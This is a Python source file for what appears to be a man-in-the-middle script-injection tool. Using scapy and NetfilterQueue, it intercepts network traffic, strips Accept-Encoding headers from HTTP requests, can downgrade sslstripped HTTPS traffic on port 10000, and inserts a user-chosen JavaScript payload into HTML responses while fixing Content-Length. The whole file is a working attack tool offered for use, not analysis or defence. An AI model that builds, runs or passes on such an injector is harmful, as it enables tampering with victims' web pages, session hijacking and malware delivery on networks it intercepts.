from scapy.all import IP, TCP, Raw, IP
from argparse import ArgumentParser, ArgumentError
from netfilterqueue import NetfilterQueue, Packet
from re import sub, search
from typing import NamedTuple, Union, Optional, Tuple

class Options(NamedTuple):
    '''
    Tuple for storing configuration constants.
    '''
    payload: str
    sslstrip: bool
    verbose: bool

acks = []

def get_args() -> 'Options':
    '''
    Parses command arguments for initialization of config options.
    '''
    parser = ArgumentParser()
    try:
        parser.add_argument('-p', '--payload', dest='payload', help='Content to inject into vulnerable traffic')
        parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose logging for debugging purposes.')
        parser.add_argument('-s', '--sslstrip', action='store_true', help='Enables sslstripping for https traffic.')
        options = parser.parse_args()
        if not options.payload:
            options.payload = "<script>alert('test');</script>"
        if not options.sslstrip:
            options.sslstrip = False
        if not options.verbose:
            options.verbose = False
        return Options(options.payload, options.sslstrip, options.verbose)
    except ArgumentError as e:
        error('An error occurred while parsing input arguments.')
        return

def update_load(packet: 'Packet', new_load: bytes) -> 'Ether':
    '''
    Replaces the load of a given packet with new_load.
    '''
    packet[Raw].load = new_load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def proc_packet(packet: 'Packet') -> None:
    '''
    Consumes a received packet. Strips enccoding from HTTP requests and injects a javascript payload into
    the contents of the load for its corresponding HTTP response.
    '''
    global config
    ip = IP(packet.get_payload())
    if ip.haslayer(Raw):
        try:
            load = ip[Raw].load.decode('utf-8')
            if ip.haslayer(TCP):
                if ip[TCP].dport == 80:
                    print(f'[+] Stripped encoding from HTTP request')
                    load = sub('Accept-Encoding:.*?\\r\\n', '', load)
                if ip[TCP].dport == 10000 and config.sslstrip:
                    print(f'[+] Stripped encoding from HTTPS request')
                    load = sub('Accept-Encoding:.*?\\r\\n', '', load)
                    load = load.replace('HTTP/1.1', 'HTTP/1.0')
                if (ip[TCP].sport == 80) or (ip[TCP].sport == 10000 and config.sslstrip):
                    load = load.replace('</body>', f'{config.payload}</body>')
                    content_len_field = search('(?:Content-Length:\s)(\d*)', load)
                    if content_len_field and 'text/html' in load:
                        content_len = content_len_field.group(1)
                        new_content_len = int(content_len) + len(config.payload)
                        load = load.replace(content_len, str(new_content_len))
            if load != ip[Raw].load.decode('utf-8'):
                new_packet = update_load(ip, load)
                packet.set_payload(bytes(new_packet))
        except (UnicodeDecodeError, UnicodeEncodeError) as e:
            pass

    packet.accept()

def error(msg: str) -> None:
    '''
    Prints an error message to standard output before exiting
    '''
    print(f'[-] {msg} Exiting...')
    exit()

def main(*args, **kwargs) -> None:
    global config
    config = get_args()
    try:
        queue = NetfilterQueue()
        queue.bind(0, proc_packet)
        print('[+] Waiting for http requests...')
        queue.run()
    except (KeyboardInterrupt, InterruptedError):
        print('\n[+] Detected interrupt. Exiting...')

if __name__ == "__main__": main()